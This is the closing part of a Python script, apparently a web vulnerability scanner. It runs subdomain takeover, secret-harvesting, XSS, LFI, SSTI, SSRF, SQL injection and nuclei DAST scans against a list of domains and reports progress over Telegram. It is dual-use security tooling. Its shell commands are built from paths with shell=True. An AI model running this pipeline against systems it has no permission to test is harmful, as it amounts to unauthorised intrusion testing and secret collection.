                nuclei_cmd = ['nuclei', '-l', hosts, '-o', output, '-t', templates]
                print(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
                subprocess.run(nuclei_cmd, shell=True, check=True)
            else:
                nuclei_cmd = ['nuclei', '-l', hosts, '-o', output]
                print(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
                subprocess.run(nuclei_cmd, shell=True, check=True)
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")

    def dast_nuclei(self):
        urls = f'{self.output_file}/urls/all-urls.txt'
        output = f'{self.output_file}/vuln/nuclei-dast-output.txt'
        templates = self.templates
        try:
            if templates:
                nuclei_cmd = f"cat {urls} | nuclei --dast -t {templates} -o {output}"
                subprocess.run(nuclei_cmd, check=True, shell=True)
                print(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
            else:
                nuclei_cmd = f"cat {urls} | nuclei --dast -o {output}"
                subprocess.run(nuclei_cmd, check=True, shell=True)
                print(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
        except Exception as e:
            print(f"{color.RED}(-) Error occurred: {e}{color.END}")


class TelegramNotify():
    def __init__(self, telegram_token, telegram_chat_id):
        self.token = telegram_token
        self.chat_id = telegram_chat_id

    def notify_telegram(self, token, chat_id, message):
        """Send Telegram notification"""
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }

        response = requests.post(url, json=payload)

        if response.status_code == 200:
            print("Notification sent successfully!")
        else:
            print(f"Failed to send notification: {response.status_code} - {response.text}")


def done():
    print(rf"""{color.GREEN}
  ________            _____                     _         ____                        ______                __   __               __      __   _____    
 /_  __/ /_  ___     / ___/_________ _____     (_)____   / __ \____  ____  ___       / ____/___  ____  ____/ /  / /   __  _______/ /__   / /  |__  /    
  / / / __ \/ _ \    \__ \/ ___/ __ `/ __ \   / / ___/  / / / / __ \/ __ \/ _ \     / / __/ __ \/ __ \/ __  /  / /   / / / / ___/ //_/  / /    /_ <     
 / / / / / /  __/   ___/ / /__/ /_/ / / / /  / (__  )  / /_/ / /_/ / / / /  __/    / /_/ / /_/ / /_/ / /_/ /  / /___/ /_/ / /__/ ,<     \ \  ___/ /     
/_/ /_/ /_/\___/   /____/\___/\__,_/_/ /_/  /_/____/  /_____/\____/_/ /_/\___(_)   \____/\____/\____/\__,_/  /_____/\__,_/\___/_/|_|     \_\/____/      
   {color.END}                                                                                                                                                     
""")


def main():
    parser = argparse.ArgumentParser(description="Web Application Vulnerability Scanner")
    parser.add_argument("-d", "--domains", required=True, help="Path to file containing list of domains")
    parser.add_argument("-templates", "--nuclei-templates", required=False, help="Path to nuclei templates")
    parser.add_argument("-sstimap", "--sstimap-path", required=False, help="Path to SSTImap")
    parser.add_argument("-o", "--output", required=True, help="Output directory name")
    args = parser.parse_args()

    domains = args.domains
    output_file = args.output
    sstimap_path = args.sstimap_path
    nuclei_templates = args.nuclei_templates
    pwd = os.getcwd()
    real_time = date.now()
    formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")
    telegram_token = ""
    telegram_chat_id = ""

    # Create an instance of TelegramNotify
    notifier = TelegramNotify(telegram_token, telegram_chat_id)
    notifier.notify_telegram(telegram_token, telegram_chat_id,
                             f"(+) Scan for {domains} Started at {formatted_time} Path:{pwd}")

    # Create directories and notify
    make_dirs = MakeDirectories(output_file)
    make_dirs.mk_dirs()
    notifier.notify_telegram(telegram_token, telegram_chat_id, f"(+) Directories created successfully")

    # Execute SubdomainsCollector and notify
    subdomains_collector = SubdomainsCollector(domains, output_file)
    subdomains_collector.subfinder_subs()
    subdomains_collector.probe()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Subdomain collection completed")

    # Execute DmarcFinder and notify
    dmarc_finder = DmarcFinder(domains, output_file)
    dmarc_finder.validate_domains()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) DMARC domains validated")

    # Execute SubdomainTakeOver and notify
    subdomains_takeover = SubdomainTakeOver(domains, output_file)
    subdomains_takeover.get_cname()
    subdomains_takeover.subzy()
    subdomains_takeover.subjack()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Subdomain takeover tests completed")

    # Execute BucketFinder and notify
    # bucket_finder = BucketFinder(domains, output_file)
    # notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) BucketFinder scan completed")

    # Execute `UrlFinder` and notify
    finder = UrlFinder(domains, output_file)
    finder.collect_urls()
    finder.extract_js_files()
    finder.extract_documents()
    finder.extract_js_data_with_mantra()
    finder.scan_for_secrets_with_gitleaks()
    finder.scan_for_secrets_with_trufflehog()
    finder.scan_for_sensitive_info_with_secretfinder()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) URL scan completed")

    # Execute XSS and notify
    xss = XSS(domains, output_file)
    xss.xss_cli()
    xss.dalfox()
    xss.xsshunter()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) XSS tests completed")

    # Execute OpenRedirect and notify
    open_redirect = OpenRedirect(domains, output_file)
    open_redirect.openredirex()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Open Redirect scan completed")

    # Execute Clickjacking and notify
    click_jacking = Clickjacking(domains, output_file)
    click_jacking.x_frame_option()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Clickjacking test completed")

    # Execute LFI and notify
    lfi = LFI(domains, output_file)
    lfi.lfi_cli()
    lfi.lfi_map()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) LFI test completed")

    # # Execute SSTI and notify
    ssti = SSTI(domains, output_file, sstimap_path)
    ssti.ssti_cli()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SSTI test completed")
    #
    # # Execute SSRF and notify
    ssrf = SSRF(domains, output_file)
    ssrf.ssrf_cli()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SSRF test completed")

    # Execute SQLI and notify
    sqli = SQLI(domains, output_file)
    sqli.ghauri()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SQL Injection test completed")

    # Execute Nuclei and notify
    nuclei = Nuclei(domains, output_file, nuclei_templates)
    nuclei.basic_nuclei()
    nuclei.dast_nuclei()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Nuclei scan completed")

    # The scan is done, notify
    finder.download_and_scan_js()
    done()
    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Web Application Vulnerability Scan Completed")


if __name__ == "__main__":
    main()
